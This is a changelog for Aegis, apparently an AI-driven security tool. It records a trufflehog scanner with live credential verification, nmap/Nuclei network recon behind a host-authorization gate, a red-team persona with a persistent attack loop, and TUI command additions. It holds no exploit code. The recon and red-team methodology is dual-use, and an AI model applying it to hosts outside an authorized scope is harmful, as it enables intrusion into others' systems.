# Aegis Release History

This is the shipped-feature changelog and historical design record for Aegis — every completed
roadmap item, why it was built, what it touched, and how it was tested. For what's currently open
or next, see [roadmap.md](roadmap.md).

---

## Latest changes

**Date:** 2026-06-29
**Last updated:** 2026-07-06 — **P13.2** (trufflehog secret scanner, opt-in alongside gitleaks,
with a host-only-gated live-verification opt-in) shipped. Only P13.3/P13.4/P13.7 remain open in P13.
**Also 2026-07-06:** **P13.6** (`threat-modeling` builtin skill covering STRIDE/LINDDUN/
PASTA/Trike/VAST/NIST 800-154, `/threat-model` TUI command, `security-architect` persona updated to
name the skill) shipped.
**Also 2026-07-06:** cross-feature integration review of the (then-uncommitted) P13.5/
P13.8 work, same pattern as the 2026-07-05 review: an adversarial fresh-context pass (not a
roadmap-prose re-verification) checking whether `recon_scan`/`red-team` actually wired into every
shared system a comparable feature is expected to. Found and fixed three seam gaps same-day:
(1) nmap findings never got an ASVS label — `buildNmapFinding` never set `Finding.CWE` and
`toolASVS`'s fallback map (`internal/security/asvs.go`) had entries for gitleaks/kubescape/hadolint
but not nmap, so every nmap finding silently carried `ASVS == ""` forever; added `"nmap": "V14
Configuration"` to the fallback map. (2) the `security-audit` skill's triage guidance
(`internal/skills/builtin/security-audit/SKILL.md`) never mentioned `recon_scan`/nmap/nuclei even
though their findings flow through the identical Report/dedup/ASVS pipeline; added a paragraph
pointing at it. (3) `recon_scan`/`aegis scan network` had no TUI or server-API surface at all,
violating the P13 cross-cutting rule that a new capability ships its `/slash` surface in the same
change (this was compounding `dast_scan`'s pre-existing identical gap rather than introducing a new
one) — added `api.ScanRequest.Targets`, a `Server.handleScan` branch calling `security.RunRecon`,
and `/scan network <target...>` (`internal/tui/slash.go`'s `cmdScan`, registered in the existing
P14.10 `commandDefs` table), with tests at both the server (`internal/server/scan_test.go`:
disallowed-target 400, allowed-target routing) and TUI (`internal/tui/scan_test.go`: bare-args usage
error) layers, plus a `docs/security.md` mention. `dast_scan`/`aegis scan dast` itself still has no
`/scan dast` TUI surface — a real, separate pre-existing gap, not addressed here since it wasn't
part of the audited new work; worth a future item if `dast_scan` needs the same treatment. The
red-team persona's five-phase self-critique loop was also noted as a hand-rolled duplicate of
`internal/debate`'s propose/critique/rebut/arbitrate primitive (not integrated) — flagged as a
missed-reuse opportunity, not fixed (single-agent self-review vs. multi-agent debate are different
shapes; revisit only if there's a concrete reason to unify them).
**Also 2026-07-06:** **P13.1.3** (opt-in bulk security-tool install, Action [3] in all
three build scripts, looping the existing `aegis security install <tool> --yes` over every scanner
descriptor) shipped.
**Also 2026-07-06:** **P13.5** (Nuclei + nmap network/host recon scanning, `recon_scan`/
`aegis scan network`) and **P13.8** (`red-team` persona + `redteam-engagement` skill built on top
of it, prompted by a user review of `elder-plinius/T3MP3ST`) shipped. P13.5.2's generalized
target-authorization gate (`internal/security/target.go`) now backs both `dast_scan` and
`recon_scan` — one shared policy, not two. Only P13.2/P13.3/P13.4/P13.6/P13.7 remain open in P13.
**Also 2026-07-06:** **P14.7** (`/model <id>` mid-session model switch) shipped. This one
needed real plumbing, not just a UI wrapper: added a genuine per-session model override (new
`sessions.model` column, `Store.SetModel`, `PATCH /sessions/{id}` field, `Server.resolveModel`
layered on top of the existing `personaModel`) since no such override existed anywhere before —
switching model previously required a model-pinning persona or a full restart.
**Also 2026-07-06:** **P14.8** (`/theme <dark|light>` live color-scheme switch — required explicitly
rebuilding `m.th` and the glamour renderer, since rebinding the scheme's package vars alone doesn't
repaint anything already built from them) and **P14.9** (folded the keymap into `/help`'s general
listing, deduplicated against the pre-existing F1 overlay via a new shared `keyMap.helpEntries()`)
shipped, closing out the entire P14 track — no open items remain in it.
**Also 2026-07-06:** **P14.6** (`/bundle [install|info <path-or-url>]`, reusing the P7.6
content-hash provenance flow and the `/security install` confirm-gating shape) and **P14.4**
(session/run/background lifecycle surface: `/archive list`, `/prune [days]`, `/runs`, `/bg
[list|events]`) shipped, both registering into the P14.10 `commandDefs` table.
**Previously, 2026-07-05:** cross-feature integration review (roadmap + codebase, focused on
seams between features rather than individual gaps) found and fixed two items same-day: **P14.1**
(completion/palette list drift — the reported bug) and **P14.10** (single source-of-truth command
table, the structural fix for that whole drift class), both shipped. The review also surfaced an
undocumented instance of the same "new capability skips a shared seam" pattern outside the TUI:
**/debate bypassed the P9.5/P10.5 daily cost/token caps** entirely and never recorded its spend to
the ledger — fixed same-day (see Appendix A). **P14.2** (in-session `/security` surface),
**P14.3** (in-session `/knowledge`/`/index`), and **P14.5** (`/status` daemon/session health,
including a new `GET /status` daemon endpoint surfacing the P9.5/P10.5 daily-spend totals that
existed in the store but were never read back out anywhere) also shipped same-day, registering into
the new P14.10 table.
P12 (multi-agent debate mode for security analysis), all 7 items, shipped. P6.3 (MCP server mode)
shipped; P6.2 (A2A), P9.3 (telemetry export), and P9.6 (bulk session/memory export-import)
evaluated and dropped, not wanted. P13 (7 exploratory items) fully researched and scoped into
concrete sub-items; P13.1, P13.5, and P13.8 (added after initial scoping) now shipped.
Full change history and design rationale for every shipped item lives below in
[Appendix A](#appendix-a--completed-work).

---

## Shipped — P13 items (Security & Capability Enhancements)

The other P13 items (P13.3/P13.4/P13.7) are still open — see
[roadmap.md](roadmap.md#open-work--p13-security--capability-enhancements).

### P13.2 — SHIPPED 2026-07-06 — trufflehog secret scanner with opt-in live verification

Added `trufflehogScanner` (`internal/security/scanners.go`) alongside gitleaks rather than
replacing it — opt-in (`DefaultEnabled: false`, same posture as the P11.3 language-targeted SAST
engines), filesystem mode, hand-written JSON-lines parser (trufflehog streams one JSON object per
result, not a single array/report file the way gitleaks or kubescape write). Findings dedupe
against gitleaks through the existing P11.8 machinery when both flag the same location, and get
the same `V6.4 Secret Management` ASVS fallback label gitleaks gets (`internal/security/asvs.go`).

**Live verification** (trufflehog's differentiator: 800+ detectors can call the real provider API
— AWS/GitHub/etc. — to confirm a found credential is still active) is a second, separate opt-in:
`security.tools.trufflehog.verify` (default false). Because it makes real outbound calls using the
actual discovered secret, and the scanner-container runner is network-isolated (`--network none`,
every scanner container's hardening posture), `verify: true` is **host-only by construction** —
`trufflehogScanner.Resolve` wraps the generic resolver and forces `MethodNone` (with an explanatory
reason) rather than `MethodContainer` whenever verification is requested, the same host-only carve-
out image scanning already has, instead of punching a network hole through the isolation posture or
silently dropping verification.

Added a `Verification` tri-state to `Finding` (`internal/security/security.go`), modeled directly on
the existing `Reachability` tri-state's "never guessed" posture: a finding is `VerificationUnknown`
unless verification was actually attempted (parseTrufflehog takes a `verifyAttempted` bool — trufflehog's
own `Verified` JSON field is always `false` when `--no-verification` ran, which is a different claim
from "checked and confirmed inactive" and must not render as one), `VerificationVerified` when the
live check confirmed the credential is active, `VerificationUnverified` when checked and found
inactive. `Format()` renders a hard-to-miss `[VERIFIED: confirmed active credential]` tag on a
verified finding; the security-audit skill's triage loop now calls out that a verified finding
should never be baseline-suppressed without an explicit, specific reviewer reason.

TUI surface: `/security-config`'s per-tool edit form conditionally adds a warning-labelled
"⚠ Verify (live credential check)" confirm field only when editing trufflehog, describing exactly
what it does before the operator turns it on; the list view's tool badge shows `verify:ON` when
set. The verified/unverified tag renders in `/scan` output automatically since both the TUI and CLI
render through the same `Report.Format()`.

Also documented AGPL-3.0 licensing (`docs/security.md`) — trufflehog is AGPL-3.0 vs. gitleaks' MIT;
Aegis only shells out to a separately-installed binary so it's a disclosure, not a code-linking
concern for Aegis itself, but worth knowing before an operator installs and runs it. Added a
recorded-fixture regression case (`internal/security/testdata/trufflehog.jsonl`,
`regression.golden.json`) exercising the verified tag end to end through the full
parse→dedup→ASVS→sort pipeline, per the existing P11.9 convention.

### P13.1 — Security config TUI/CLI: cross-platform availability gap

Audited against the current codebase: `/security-config` (TUI) and `aegis security
status/install/config` (CLI) already exist and are comprehensive — P11.10/P11.11 shipped live
per-tool availability (host binary / container / unavailable, with a reason), guided per-OS
install with confirmation, and method/image/install-policy configuration. The original framing of
this item ("doesn't currently exist... not working at all") no longer matches the codebase.

The one real, concrete gap: neither surface says which *other* platforms a tool supports when it's
unavailable on yours. `ScannerDescriptor.Install` already carries a `map[string]string` keyed by
`darwin`/`linux`/`windows` (`internal/security/method.go`) — the data exists, it's just never
surfaced beyond the current `runtime.GOOS`.

- **P13.1.1 — SHIPPED 2026-07-05** — `security.InstallAvailability`/`AvailabilityNote`
  (`internal/security/install.go`) report which *other* OSes have a guided host install, and both
  `aegis security status`'s DETAIL column and the `/security-config` status line now append "no
  native host install for $OS (available on: …) — configure security.tools.&lt;name&gt;.image for a
  container fallback" when the current OS lacks one. Note-gated to genuine missing-host-binary
  reasons only (never disabled/opt-in/container reasons). Tests in `install_test.go`. (S)
- **P13.1.2 — SHIPPED 2026-07-05** — folded into P13.1.1's single note (the "configure a container
  image" next-step is part of the same `AvailabilityNote` string), rather than a second separate
  line. (S)
- **P13.1.3 — SHIPPED 2026-07-06** — `aegis security install <tool>` (P11.10) required running one
  tool at a time from the CLI; there was no bulk first-run path. Added an opt-in **Action [3]** to
  all three build scripts (`build-macos.sh`, `build-linux.sh`, `build-windows.ps1`) that loops
  `aegis security install <tool> --yes` over every scanner in `internal/security/method.go`'s
  `descriptors` map (`zap` excluded — container-only, no host install command) using the binary
  Action 1 just built. Deliberately reuses the existing gated CLI command rather than duplicating
  install commands in shell/PowerShell, so the descriptor map stays the single source of truth.
  Never folded into `all` — selecting it requires explicitly passing `3` (e.g. `./build-linux.sh
  "all 3"`) since it's a privileged, host-modifying action across many tools at once. Best-effort:
  a failed tool (missing Go/pipx/gem/scoop toolchain) is reported in a per-run summary without
  aborting the rest. Verified bash/PowerShell syntax and the full selection/loop/summary logic
  against stub `aegis` binaries (including a simulated failure) rather than the real installers.
  (S)

Priority: Low, Effort: S — **done**. Caveat surfaced during the follow-up review: the new
cross-platform availability info lives in `aegis security status` (CLI) and the `/security-config`
dialog, but `aegis security status` itself has **no TUI slash command at all** — so from inside a
session you can't see it without the config dialog. That stranding is the seed of the P14 track
below; full in-session reach is **P14.2**.

### P13.5 — SHIPPED 2026-07-06 — Nuclei scanner addition (+ nmap)

Shipped all seven sub-items, plus nmap (a genuinely useful complement requested alongside Nuclei —
nmap does the actual port/service/host discovery; Nuclei matches vulnerability templates against
whatever nmap found alive). Both run as one `recon_scan` tool call / `aegis scan network` command.

- **P13.5.1/.5** — Added `nucleiScanner`/`nmapScanner` (`internal/security/recon.go`), both
  implementing a new small `ReconScanner` interface (`Name`/`Resolve`/`Scan`) aggregated by
  `RunRecon` the same way `RunWithOptions` aggregates the file-based `Scanner` interface. Nuclei
  runs with `-sarif-export`, consumed via the existing `ParseSARIF` ingester (no new parsing code,
  as scoped) — `DedupFindings`/`assignASVS` apply the same as every other scan path. Nmap has no
  SARIF export, so it gets a small local XML parser (`encoding/xml`) instead, turning each open
  port into a `Finding` — with a curated severity-bump table (Telnet, FTP, unauthenticated Redis, an
  exposed Docker API, SMB, RDP, VNC, Elasticsearch, etc.) that flags commonly-risky exposed services
  `MEDIUM`/`HIGH` with specific remediation instead of leaving every open port at bare `INFO`.
- **P13.5.2** — Extracted the shared gate into `internal/security/target.go`: `isHostAllowed` (bare
  host/IP, loopback-private-auto-allow-else-declared) plus the generalized
  `hostMatchesAllowEntry`/`isLoopbackOrPrivateHost`/`networkPrivateRanges`. `isDASTTargetAllowed` is
  now a thin URL-parsing wrapper over it; `recon_scan`'s bare-host/CIDR targets call it directly.
  One policy for every network-target-reaching tool (ZAP, nmap, nuclei), not three.
- **P13.5.3** — `RunRecon` checks every target individually before running anything (one bad host
  fails the whole call, listed by name) and caps a single call at 256 targets (rejected outright
  above that, never silently truncated).
- **P13.5.4** — `security.dast.allow_active` (the *same* flag ZAP's active mode uses, not a second
  one) gates both scanners' aggressive modes: nuclei excludes `dos`/`fuzz`/`intrusive`-tagged
  templates by default; nmap runs a top-100-port version scan by default and only adds OS
  detection/full-port-range/default-scripts when active.
- **P13.5.6** — `security.tools.nuclei.templates_version` (new `SecurityToolConfig` field) must name
  a `nuclei-templates` release tag; `resolveNucleiTemplates` shallow-clones that tag once into a
  per-version cache dir and always runs with `-duc` (disable update check) — nuclei never pulls an
  unpinned "latest" template set. Missing config reports nuclei skipped with that exact reason.
- **P13.5.7** — `aegis scan network <target> [<target>...]` (`internal/cli/scan.go`) and the
  standalone `recon_scan` tool (`internal/tool/builtin/recon.go`, deferred like `dast_scan`, reusing
  the existing `opts.DASTAllowedTargets`/`DASTAllowActive` wiring — no new `builtin.Options` fields
  or per-entrypoint plumbing needed). Both scanners are host-binary-only for v1 (no container
  fallback — a network-isolated scanner container can't reach LAN targets, same reasoning as image
  scanning's existing host-binary-only precedent). No TUI slash command yet — matches `dast_scan`'s
  current CLI-only state.

Tests: `internal/security/target_test.go` (generalized host-gate unit tests, migrated off
`dast_test.go`), `internal/security/recon_test.go` (multi-host cap, per-host gate enforcement, nmap
arg construction + XML parsing + severity-bump table, nuclei tag-exclusion arg construction +
template-pin-required skip reason). Docs: new "Network / Host Reconnaissance (nmap + Nuclei)"
section in `docs/security.md`, mirroring the DAST section's structure and cross-referencing it for
the shared gate rather than re-explaining it.

See P13.8 below for the `red-team` persona + `redteam-engagement` skill built on top of this.

### P13.8 — SHIPPED 2026-07-06 — Red-team persona + `redteam-engagement` skill

Prompted by a user review of `elder-plinius/T3MP3ST` (an autonomous red-teaming framework) asking
what capabilities were worth adopting into Aegis. Built on top of P13.5's `recon_scan` (nmap +
nuclei): a new `red-team` built-in persona (`internal/persona/persona.go`) and a dormant-by-default
`redteam-engagement` builtin skill (`internal/skills/builtin/redteam-engagement/`), adapting
T3MP3ST's genuinely transferable patterns —

- A five-phase operating loop (RECON → PLAN → EXECUTE+TRACK → REFLECT → SELF-CRITIQUE), with a
  findings ledger using explicit CONFIRMED/REFUTED/OPEN/NEXT states per row and a "three failed
  variants of the same attack class → switch tactics" persistence rule.
- An evidence-before-claim self-critique rule: nothing is marked CONFIRMED without a concrete
  citation (command output, response header, scan finding ID) — an unverified hit stays OPEN.
- MITRE ATT&CK mapping per finding, matching the existing `security-researcher` persona's
  convention.
- A non-negotiable scope rule in the persona prompt (state the authorized target list back to the
  user before any tool call) as belt-and-suspenders *on top of* — never instead of — the real
  enforcement: `recon_scan`/`dast_scan`'s hard `isHostAllowed` gate, which is mode-independent and
  runs whether or not the model remembers to check.

Skill companion assets (`references/rules-of-engagement-template.md`,
`references/findings-ledger-template.md`) mirror `content-review`'s `references/*.md` bundling
pattern; picked up automatically by the existing `go:embed builtin` directory walk, no registry to
update. `docs/personas.md` got the new persona's row.

**Explicitly not adopted from T3MP3ST**, both scoped out during design and worth recording so they
aren't re-proposed without a reason to revisit: its 18 LLM-jailbreak/prompt-injection techniques
(red-teaming the LLM itself is a different problem from red-teaming infrastructure, and wasn't what
was asked), and any exploit-chaining/credential-attack tooling (Metasploit/Hydra-style) — Aegis's
posture stays "surface and validate vulnerabilities," matching `dast_scan`'s existing baseline/active
design. Also deferred: P13.4's persistent multi-day "engagement notebook" extending
`internal/memory` — a real idea, separate scoped item in roadmap.md; this ships a per-engagement
report file (via `write_file`), which is enough for a single red-team exercise.

### P13.6 — SHIPPED 2026-07-06 — Threat-modeling skill (`threat-modeling`) + `/threat-model` command

Researched six named frameworks (STRIDE, LINDDUN, PASTA, Trike, VAST, NIST 800-154) plus three
companion techniques worth adding as optional add-ons (Attack Trees, MITRE ATT&CK mapping, Evil User
Stories). Design call per the roadmap's recommendation: one skill bundle
(`internal/skills/builtin/threat-modeling/`), not a new persona and not one skill loaded per
framework — the skill's job is to pick the right framework for the system at hand (asking a
clarifying question when the user hasn't named one, using a focus/best-use-case table to frame the
choice, defaulting to STRIDE only when there's genuinely no signal and no way to ask) and then follow
that framework's process exactly.

- One `references/<framework>.md` per framework (`stride.md`, `linddun.md`, `pasta.md`, `trike.md`,
  `vast.md`, `nist-800-154.md`) — each documents the framework's categories/stages, a step-by-step
  process grounded in exploring the real workspace first (never an assumed architecture), and a
  concrete output template, so the model (and a reader wanting to learn the framework) has a written
  reference to align output against rather than reconstructing the framework from memory each time.
- `references/companion-techniques.md` covers Attack Trees, MITRE ATT&CK mapping, and Evil User
  Stories as optional layers on top of a primary framework, plus a short note on when combining
  frameworks (hybrid modeling) is and isn't worth the added effort.
- `securityArchitectSystem` (`internal/persona/persona.go`) now names the skill in its threat-modeling
  workflow instead of hardcoding STRIDE/LINDDUN — the P12 debate-mode routing hook (route each
  threat/mitigation pair through `agent` `mode:"debate"` when `security.debate.threat_model` is
  enabled) is preserved unchanged in the skill itself.
- New `/threat-model [system or feature]` TUI command (`internal/tui/commands.go`'s `commandDefs`
  table, handler in `internal/tui/slash.go`): sends a message that explicitly invokes the skill and
  asks the framework-selection question as part of the resulting turn, rather than depending on the
  model noticing a trigger phrase in free text — the same P13 cross-cutting TUI-surface requirement
  every other item in this track follows. Covered automatically by the existing P14.1/P14.10
  command-surface sync tests since it's a `commandDefs` entry, not a separately hand-listed command.
- `docs/personas.md` (security-architect's row now names the skill and its frameworks),
  `docs/configuration.md`, `docs/memory-and-knowledge.md`, and `CLAUDE.md`'s built-in-skills lists
  updated; the pre-existing `redteam-engagement` skill was also missing from those same lists
  (a stale-docs bug predating this change) and got added at the same time.

---

## P14 — TUI Command-Surface Parity & Discoverability (fully shipped, P14.1–P14.10)

A review of the TUI's slash-command surface against (a) the actual dispatch table, (b) the CLI
subcommand tree, and (c) the daemon client API found a real, reported defect plus a broad
discoverability gap: many daemon/CLI capabilities have no in-session `/slash` command, and the
lists that *should* agree about which commands exist have silently drifted.

**Root-cause finding (the reported bug), fixed.** A built-in slash command used to be declared in
*three* hand-maintained places that had to agree: the dispatch table (`d.builtins`,
`internal/tui/slash.go`), the `/help` listing + detailed help (`cmdHelp`/`builtinHelp`, same file),
and the completion-popup/command-palette source (`builtinCommands`, `internal/tui/completion.go`).
`help_test.go` guarded the first two against each other — but nothing guarded `builtinCommands`, so
`security-config`, `scan`, `debate`, `rollback`, `detach`, `archive`, and `humor` were all fully
dispatchable and listed in `/help`, yet never appeared in the `/`-autocomplete popup or palette.
That was precisely why `/security-config` "didn't exist" from the user's point of view: typing
`/sec` surfaced nothing.

**P14.1 — SHIPPED 2026-07-05** — the seven missing entries were added to `builtinCommands` (and the
arg-taking ones — `security-config`/`scan`/`debate`/`rollback`/`detach`/`archive`/`humor` — to
`commandsNeedingArgs`), plus a guard test (`TestBuiltinCommandsCoverDispatchTable`,
`internal/tui/completion_test.go`) asserting `builtinCommands` covers every `d.builtins` key except
the `quit` alias, mirroring `TestSlashCommandsAreListedInHelp`. There is still no dedicated
`/security` umbrella command (only `/security-config`) — that's P14.2, not part of this fix.

**P14.10 — SHIPPED 2026-07-05** — the structural cure, built immediately after P14.1 rather than
left as a follow-up: `internal/tui/commands.go` (new) defines each built-in command exactly once as
a `commandDef` struct (name, arg hint, short description, detailed help, whether it needs args, and
its handler as a method expression `(*SlashDispatcher).cmdX`). `d.builtins` (dispatch), `cmdHelp`'s
general listing, `builtinHelp` (detailed `/help <name>`), and `completion.go`'s `builtinCommands`/
`commandsNeedingArgs` are now all derived from this one table — a fourth list can no longer drift
out of sync with the other three, closing the entire class of bug P14.1 fixed one instance of.
`commandDefs` is a function rather than a package-level `var`: a `var` initializer that references
handler values whose bodies range over that same `var` is a compile-time initialization cycle in
Go, so the table is rebuilt on each lookup instead (cheap — ~26 entries, called only on dispatcher
construction, `/help`, and popup population). New test `TestCommandDefsWellFormed` guards the table
itself (no empty/duplicate names, every entry has a handler and help text). All P14.2–P14.9
`/`-surface additions below should register into this table rather than reintroducing hand-written
lists.

### P14.2 — SHIPPED 2026-07-05 — In-session security surface (`/security`)

`/security-config` was the only security command in the TUI; `aegis security status` (carrying the
P13.1 cross-platform availability info), `aegis security install <tool>`, and `aegis security
baseline` were CLI-only. Added `/security [status|install <tool> [confirm]|baseline [path]|config
[global]]` (`internal/tui/slash.go`'s `cmdSecurity` and its four sub-handlers) so the whole
security-tooling surface is reachable in-session — registered as a single new entry in the P14.10
`commandDefs` table, which is the payoff of building P14.10 first: dispatch, `/help`, and the
completion popup all picked it up automatically with no separate edits.

- `status`/bare args and `baseline [path]` are read-only local computations (same pattern as the
  existing `/sandbox` and `/security-config`: read the TUI process's own config/workspace directly,
  no daemon round trip) mirroring the CLI's tabwriter-formatted output exactly.
- `config [global]` delegates to the existing `cmdSecurityConfig` handler rather than duplicating
  its dialog-opening logic.
- `install <tool> [confirm]` adapts the CLI's interactive y/N approval gate to the slash-command
  shape, where a command returns one `SlashResult` with no stdin prompt: the first invocation only
  previews the tool summary and exact host command; a second invocation with a literal trailing
  `confirm` argument actually runs `security.RunGuidedInstall`. Never installs without that explicit
  word, preserving the "never install silently" posture from P11.10 without adding new dialog/
  confirmation-view plumbing.
- Tests: `internal/tui/security_test.go` (8 cases — status, baseline empty/populated, config
  delegation to both scopes, install unknown-tool error, install requires explicit confirm, unknown
  subcommand error).

### P14.3 — SHIPPED 2026-07-05 — Knowledge base & repo index in-session (`/knowledge`, `/index`)

`aegis knowledge index` (P3.3/P5.8 project knowledge base) and `aegis index` (P2.3 repo map) were
CLI-only; the model has tools for them but the user couldn't drive indexing/query from the TUI. Added
`/knowledge [index|query <text>]` and `/index`, both routed through the daemon (new `POST /knowledge`
and `POST /repomap/index` endpoints) rather than opening a second local store, since `/index` also
needs to refresh the daemon's own cached system-prompt block. See the full writeup below (folded
into Appendix A's P14.3 entry).

### P14.4 — SHIPPED 2026-07-06 — Session / run / background lifecycle surface

Only the Ctrl+R picker and `/archive [off]` touched session lifecycle from the TUI; `aegis
sessions`, `aegis bg list|events`, `aegis runs`, session pruning, and archived-session listing were
CLI-only. `/session [list]` (singular) already existed from an earlier pass and covers the
`/sessions [list]` half of this item, so no duplicate command was added for that. Added `/archive
list` (lists archived sessions via the existing `ListArchivedSessions` client call, filtered to
`Archived: true` since that endpoint returns all sessions when queried with `archived=true`),
`/prune [days]`, `/runs`, and `/bg [list|events [session-id]]` — all new entries in the P14.10
`commandDefs` table (`internal/tui/commands.go`), handlers in `internal/tui/slash.go`
(`cmdPrune`, `cmdRuns`, `cmdBG`; `cmdArchive` gained the `list` branch). `/bg events` defaults to
the current session if no id is given, unlike the CLI's `aegis bg events <id>` which requires one.
All four reuse the client methods the roadmap already flagged as available
(`ListArchivedSessions`/`PruneSessions`/`ListRuns`/`GetBGEvents`) — no new daemon endpoints needed.
Tests: `internal/tui/lifecycle_test.go` covers the argument-validation fast paths that return
before touching the client (`/prune not-a-number`, unknown `/bg` subcommand), matching this
codebase's established convention of not spinning up an `httptest` server inside `internal/tui`
tests (noted in the P14.5 writeup) — the daemon-side round trip for these endpoints is already
covered by existing `internal/server` tests. Docs: `docs/tui-guide.md`'s Navigation & Sessions
table.

### P14.5 — SHIPPED 2026-07-05 — `/status` daemon/session health

`warnSandboxFallback` printed the sandbox-fallback warning once to stderr *before* the TUI started,
then it was gone for the rest of the session. Added `/status` (`internal/tui/slash.go`'s
`cmdStatus`, registered in the P14.10 `commandDefs` table) showing daemon reachability,
provider/model, the active sandbox backend and any fallback reason, this session's cumulative
spend against its caps, and cross-session *today's* spend against the P9.5/P10.5 daily caps.

The daily-spend half needed real daemon plumbing, not just a UI: `client.Status()`/`/healthz` never
carried it (by design — `/healthz` is polled every ~100ms by `waitForDaemon` during startup, so it
stays minimal), and the actual daily totals only lived in `session.Store.TodayCost`/`TodayTokens`,
already written by `recordDailySpend` for the P9.5/P10.5 caps but never read back out anywhere. Added
a new `GET /status` endpoint (`api.StatusInfo`, `Server.handleStatusInfo`, `Client.StatusInfo`)
distinct from `/healthz` so the frequently-polled path doesn't pay for two extra DB reads per call.
Sandbox backend *name* (as opposed to the fallback bool/reason, which is daemon-authoritative) is
read from the local config, matching the existing no-daemon-round-trip convention `/sandbox` and
`/security` already use. Tests: `TestServerStatusEndpoint` (`internal/server/server_test.go`) for
the new endpoint; the TUI-side command has no dedicated round-trip test, matching this codebase's
existing convention of not spinning up an `httptest` server inside `internal/tui` tests — covered by
the endpoint test plus a manual `/status` run against a live daemon. P13.4.4's engagement/activity
digest (not started) can extend this command's output rather than adding a separate one.

### P14.6 — SHIPPED 2026-07-06 — `/bundle [install|info <path-or-url>]`

`aegis bundle install/info <git-url>` (P5.7, with P7.6 content-hash pinning) was CLI-only; installing
a persona/skill bundle mid-session forced a trip out to the shell. Added `/bundle info <path-or-url>`
and `/bundle install <path-or-url> [global] [sha256:<hash>] [confirm]`
(`internal/tui/slash.go`'s `cmdBundle`/`cmdBundleInfo`/`cmdBundleInstall`, registered in the P14.10
`commandDefs` table), calling `internal/bundle` directly (no daemon round trip needed — bundle
install/info are pure local-filesystem operations, same as `/sandbox` and `/security`) rather than
shelling out to the CLI binary.

- Since slash commands don't have flag syntax, the CLI's `--scope`/`--expect-sha256` flags become
  trailing keyword tokens in any order: `global` selects the user data dir instead of the default
  project `.aegis/` scope (matching the `global` keyword `/skills` and `/security-config` already
  use for the same distinction), and a bare or `sha256:`-prefixed hash pins the P7.6 content-hash
  provenance check.
- Reused the exact confirm-gating shape `/security install` established: the first invocation only
  previews the manifest, artifact list, target scope directory, and content hash; nothing is
  written until a second invocation adds a literal trailing `confirm`. A hash mismatch aborts
  before installing even with `confirm` present, same as the CLI's `--expect-sha256`.
- `bundleIsGitURL`/`bundleResolveSource`/`bundleScopeDir` are unexported copies of
  `internal/cli/bundle.go`'s equivalents (git-URL detection/shallow-clone-to-temp-dir/scope
  resolution) — kept separate rather than shared, matching the existing `securityMethodLabel`
  precedent that `internal/cli` isn't (and shouldn't become) an import of `internal/tui`.
- Tests: `internal/tui/bundle_test.go` (8 cases) — bare-args/unknown-subcommand/missing-path usage
  errors before touching the filesystem, content-hash display, preview-writes-nothing without
  `confirm`, `confirm` actually installs, P7.6 hash-mismatch abort, and `global` scope targeting the
  user data dir instead of the project's `.aegis/`.

### P14.7 — SHIPPED 2026-07-06 — `/model <id>` direct mid-session model switch

`/models` showed model info but couldn't switch; changing model mid-session required a
model-pinning persona or a restart. This needed real plumbing, not just a UI wrapper: no per-session
model override existed anywhere — a session only ever resolved its model through
`personaModel` (config override → persona's own `Model` → global `provider.model`), fixed for the
session's lifetime via whichever persona it carried.

- Added a `model` column to the `sessions` table (`internal/session/session.go`, same idempotent
  `ALTER TABLE ADD COLUMN` migration pattern as `persona`/`background`), a `Model` field on both
  `Session` and `Meta`, and `Store.SetModel` mirroring `SetPersona`. Empty string means "no
  override" — falls through to the persona/global default.
- `api.SessionMeta` and `api.UpdateSessionRequest` gained a `Model`/`Model *string` field; `PATCH
  /sessions/{id}` (`handleUpdateSession`) persists it via `SetModel` the same way it already does
  for `Mode`/`Persona`.
- New `Server.resolveModel(p persona.Persona, sessionModel string) string` layers the session
  override on top of the existing `personaModel(p)`: non-empty `sessionModel` wins outright,
  otherwise falls through unchanged — same precedence relationship a config-level persona override
  already has over a persona file's own `Model`. `newEngine` gained a `modelOverride string`
  parameter (its one call site, `handlePostMessage`, passes `sess.Model`) and now calls
  `s.resolveModel(p, modelOverride)` instead of `s.personaModel(p)` directly, so both the guard
  model and the turn's actual model pick up the override.
- TUI: `/model <model-id>` (`internal/tui/slash.go`'s `cmdModel`, registered in the P14.10
  `commandDefs` table) calls the existing `client.UpdateSession` (no new client method needed, same
  as `/mode`/`/persona`); `/model default` clears the override by sending an empty string. No args
  shows the current model.
- **Not enforced, by design, matching the persona-level precedent**: neither this nor a persona's
  own `Model` field is validated against the configured provider's actual model list — there is no
  such list anywhere in the codebase today. "Constrained to same-provider" is an architectural
  fact (the daemon has exactly one `provider.Adapter` bound to one provider), not a runtime check;
  requesting a model belonging to a different provider than the configured adapter surfaces as a
  provider error on the next turn, not at switch time. The command's help text says this
  explicitly rather than implying validation that doesn't exist.
- **Known cosmetic gap, not fixed here**: the TUI's model display used for the context-window-size
  calculation and status/welcome text (`m.cfg.Model` in `internal/tui/tui.go`) is set once at
  startup and isn't updated by `/model` (mirroring `/mode`'s existing, pre-P14.7 gap — `m.cfg.Mode`
  is likewise only refreshed on a session switch, not on `/mode` itself). The session-level override
  this item is about is real and does change what model the next turn actually uses; only the
  sidebar/context-bar cosmetic display can lag behind it.
- Tests: `internal/server/server_guard_test.go`'s `TestResolveModelSessionOverrideWins` (session
  override beats a config-pinned persona; empty falls through to `personaModel`),
  `internal/server/server_test.go`'s `TestPatchSessionModel` (PATCH → GET round trip, patch-response
  echo, clearing back to empty — real daemon, real SQLite store), and
  `internal/tui/model_test.go`'s bare-args fast path. Verified manually end-to-end against a live
  daemon with a scratch session: switch, re-read, clear, re-read, then deleted the scratch session.

### P14.8 — SHIPPED 2026-07-06 — `/theme <dark|light>` runtime theme switch

`tui.theme` was config-only and needed a restart, even though `applyTheme`/`applyScheme` (TQ10)
already supported rebinding the color scheme at runtime. The missing piece wasn't the scheme swap
itself — it was that nothing rebuilt the things built *from* the scheme at startup: `m.th` (a
`theme` of `lipgloss.Style` values that capture colors at construction, per `theme.go`'s own
comment) and the glamour markdown renderer (`newGlamourRenderer`, keyed off the package-level
`glamourStyleName`, previously only ever recreated on a width change).

- `internal/tui/commands.go`: new `theme` entry (`argHint: "<dark|light>"`, `needsArgs: true`),
  registered into the P14.10 `commandDefs` table like every other P14 item.
- `internal/tui/slash.go`'s `cmdTheme`: no args shows the current theme; an unknown name is rejected
  as an error at the dispatcher level (same validate-your-own-args precedent as `/mode`/`/sandbox`)
  rather than silently falling back like a config-file typo would. `SlashDispatcher` has no
  reference to `model` (theme is package-global TUI state, not per-session), so a valid switch
  can't apply itself — it emits a `"\x00theme <name>"` sentinel `Output`, the same
  local-UI-state-change convention already used by `/humor`, `/sidebar`, and `/copy`.
